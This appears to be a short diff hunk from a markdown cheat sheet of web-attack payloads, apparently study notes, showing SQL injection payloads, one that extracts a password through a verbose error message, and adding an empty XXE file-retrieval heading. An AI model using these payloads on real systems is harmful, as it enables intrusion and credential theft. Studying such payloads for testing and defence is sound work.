@@ -92,3 +92,8 @@ conditional based blind SQL injection:`' union select null from users where user
 ### Extracting sensitive data via verbose SQL error messages
 
 Payload: `' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+
+## [](#header-2) XXE
+
+### Exploiting XXE to retrieve files
+
